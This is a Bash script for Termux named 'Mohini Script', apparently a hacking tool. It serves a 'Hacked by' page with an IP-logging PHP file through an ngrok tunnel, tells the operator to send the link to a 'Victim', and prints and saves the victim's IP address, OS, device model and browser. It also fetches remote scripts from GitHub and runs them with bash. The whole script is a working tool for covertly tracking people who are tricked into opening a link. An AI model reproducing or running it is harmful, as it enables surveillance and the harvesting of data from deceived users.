trap 'printf "\n";stop' 2
load() {
sleep 6 & PID=$! #Loading... Animation
echo
echo
printf "\e[32m["
while kill -0 $PID 2> /dev/null; do
printf  "▓"
sleep 1
done
printf "]\n\e[0m\e[1m\n"
}
banner() {
cd $HOME/Mohini/logo
bash logo.sh
}
mohini_ip() {
user=$(grep -e 'User' ip.txt | cut -d '(' -f1 | cut -d ':' -f2)
osname=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ';' -f2 | tr -cd aA-zZ)
osversion=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ';' -f2 | awk '{print $2;}')
LEN=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ')' -f2 | tr -cd aA-zZ)
LEV=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ')' -f2 | tr -cd 0.0-9.0)
device_type=$(grep -e 'User' ip.txt | cut -d '(' -f3 | cut -d ')' -f2 | cut -d '/' -f2 | cut -d '.' -f4 | tr -d '0-9' | awk '{print $1;}')
browser=$(grep -e 'User' ip.txt | cut -d '(' -f3 | cut -d ')' -f2 | awk '{print $1;}')
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device_model=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | cut -d ';' -f3)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP :\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent :\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] OS name :\e[0m\e[1;77m %s\e[0m\n" $osname
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] OS version :\e[0m\e[1;77m %s\e[0m\n" $osversion
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Layout Engine Name :\e[0m\e[1;77m %s\e[0m\n" $LEN
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Layout Engine Version :\e[0m\e[1;77m %s\e[0m\n" $LEV
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device Type :\e[0m\e[1;77m %s\e[0m\n" $device_type
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device Model :\e[0m\e[1;77m %s\e[0m\n" $device_model
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Browser :\e[0m\e[1;77m %s\e[0m\n" $browser
cat ip.txt >> mohini.txt
}
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
exit 1
}
req() {
command -v python > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] Python Installing...";load;pkg install python -y;clear; }
command -v php > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] PHP Installing...";load;pkg install php -y;clear; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] Unzip Installing...";load;pkg install unzip -y;clear; }
command -v wget > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] wget Installing...";load;pkg install wget -y;clear; }
command -v lolcat > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] lolcat Installing...";load;pip install lolcat;clear; }
command -v figlet > /dev/null 2>&1 || { echo >&2 "...";clear;banner;echo "";echo "";echo "[^^] Figlet Font Installing...";load;pkg install figlet -y;clear; }
}
req2() {
cd $HOME
cd Mohini
if [[ -e "index.php" ]]; then
echo ""
else
clear
banner | lolcat
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/mn.html
cat mn.html >> mohini
rm -rvf mn.html
clear
figlet "      Enter Name" | lolcat
echo -e "\e[1m\e[36m\t   Enter Your Name..!! ( e.g, Bull Anonymous )\n"
echo -e "\e[1m\e[33m\n Hacked by ( \e[36mYour Name \e[33m)\e[32m :\n\n "
read varhack
echo
clear
cd
echo "<h1> by <b> $varhack  </h1>  " >> $HOME/Mohini/mohini
clear
echo
cd
cd Mohini
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/mn2.html
cat mn2.html >> mohini
rm -rvf mn2.html
cat mohini >> index.php
rm -rvf mohini
fi
}
req3() {
cd $HOME
cd Mohini
if [[ -e "ip.php" ]]; then
echo ""
else
clear
banner | lolcat
echo
printf "\e[1;92m[\e[0m^^\e[1;92m] Downloading IP.php file...\n"
load
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/ip.php
clear
fi
}
mohini_ip() {
user=$(grep -e 'User' ip.txt | cut -d '(' -f1 | cut -d ':' -f2)
osname=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ';' -f2 | tr -cd aA-zZ)
osversion=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ';' -f2 | awk '{print $2;}')
LEN=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ')' -f2 | tr -cd aA-zZ)
LEV=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ')' -f2 | tr -cd 0.0-9.0)
device_type=$(grep -e 'User' ip.txt | cut -d '(' -f3 | cut -d ')' -f2 | cut -d '/' -f2 | cut -d '.' -f4 | tr -d '0-9' | awk '{print $1;}')
browser=$(grep -e 'User' ip.txt | cut -d '(' -f3 | cut -d ')' -f2 | awk '{print $1;}')
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device_model=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | cut -d ';' -f3)
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] IP :\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] User-Agent :\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] OS name :\e[0m\e[1;77m %s\e[0m\n" $osname
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] OS version :\e[0m\e[1;77m %s\e[0m\n" $osversion
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] Layout Engine Name :\e[0m\e[1;77m %s\e[0m\n" $LEN
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] Layout Engine Version :\e[0m\e[1;77m %s\e[0m\n" $LEV
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] Device Type :\e[0m\e[1;77m %s\e[0m\n" $device_type
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] Device Model :\e[0m\e[1;77m %s\e[0m\n" $device_model
printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] Browser :\e[0m\e[1;77m %s\e[0m\n" $browser
cat ip.txt >> hacked.txt
}
mohini() {
printf "\n\n"
printf "\e[1;92m[\e[0m^^\e[1;92m]Send Mohini Link to your Victim...\e[91m\e[1m(Don't Close Termux)\e[0m\e[1m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
clear
banner | lolcat
echo
echo
printf "\n\e[1;92m[\e[0m^^\e[1;92m] Target Found !!!\n"
echo
mohini_ip
rm -rf ip.txt
echo
echo
exit
fi
sleep 0.5
done
}
ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
clear
banner | lolcat
echo
printf "\e[1;92m[\e[0m^^\e[1;92m] Downloading Ngrok...\n"
load
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://github.com/remo7777/REMO773/raw/master/Ngrok-linux-arm.zip && unzip Ngrok*.zip && chmod 777 ngrok > /dev/null 2>&1
if [[ -e Ngrok-linux-arm.zip ]]; then
rm -rf Ngrok-linux-arm.zip
else
printf "\e[1;91m[!] Download error...\e[0m\e[1m "
exit 1
fi
fi
fi
clear
banner | lolcat
echo
printf "\e[1;92m[\e[0m^^\e[1;33m] Mohini Server Starting...\e[91m\e[1m(1/2)\n"
load
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
clear
banner | lolcat
echo
printf "\e[1;92m[\e[0m^^\e[1;33m] Mohini Server Starting...\e[91m\e[1m(2/2)\n"
load
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
clear
banner | lolcat
echo
printf "\e[1;92m[\e[0m^^\e[1;33m] Mohini link:\e[0m\e[1;77m %s\e[0m\n" $link
mohini
}
server() {
ngrok_server
}
menu() {
printf "\n\e[1m\e[33m[\e[91m^^\e[33m]\e[1;91m\e[33m\e[1m Mohini Server :\n\e[0m\n\n"
printf "\e[1m\e[32m[1] \e[36m\e[1mStart\n"
printf "\e[1m\e[91m[2] \e[36m\e[1mExit\n"
printf "\e[1m\e[95m[3] \e[36m\e[1mBullmux\n"
printf "\e[1m\e[33m[4] \e[36m\e[1mAbout\n"
printf "\n\n"
printf '\e[1;33m[\e[0m\e[1;77m^^\e[0m\e[1;33m] \e[0m\e[1;77mSelect Option : \e[33m\e[1m'
read option
if [ -z "$option" ]; then
exit 1
fi
if [ "$option" -eq 1 ]; then
clear
banner | lolcat
server
fi
if [ "$option" -eq 2 ];then
clear
echo
banner | lolcat
echo -e "\e[36m\e[1mExit Mohini Script...!!\e[0m\e[1m"
echo
sleep 2
cd
exit 1
printf "\n"
fi
if [ "$option" -eq 3 ];then
clear
echo
banner | lolcat
echo -e "\e[36m\e[1mSkip Ads & Download Bullmux...!!\e[0m\e[1m"
echo
sleep 2
cd
wget https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Bullmux.sh
bash Bullmux.sh
rm -rvf Bullmux.sh
clear
fi
if [ "$option" -eq 4 ]; then
clear
banner | lolcat
echo
echo
echo -e "\t\t\e[33m\e[1m[^^]\e[0m\e[1m Name  \t\e[91m\e[1m:  \e[92m\e[1mMohini Script"
sleep 1
echo -e "\t\t\e[33m\e[1m[^^]\e[0m\e[1m Lang.  \t\e[91m\e[1m:  \e[92m\e[1mBash"
sleep 1
echo -e "\t\t\e[33m\e[1m[^^] \e[0m\e[1mAuthor  \t\e[91m\e[1m:  \e[92m\e[1mParixit Sutariya"
sleep 1
echo -e "\t\t\e[33m\e[1m[^^] \e[0m\e[1mYT  \t\e[91m\e[1m: \e[92m\e[1m yt.com/BullAnonymous"
sleep 1
echo -e "\t\t\e[33m\e[1m[^^] \e[0m\e[1mGithub  \t\e[91m\e[1m:  \e[92m\e[1mgithub.com/Bhai4You"
sleep 1
echo -e "\t\t\e[33m\e[1m[^^] \e[0m\e[1mDate  \t\e[91m\e[1m:  \e[92m\e[1m23-3-20"
sleep 1
echo
fi
}
clear
req
req2
req3
banner | lolcat
menu
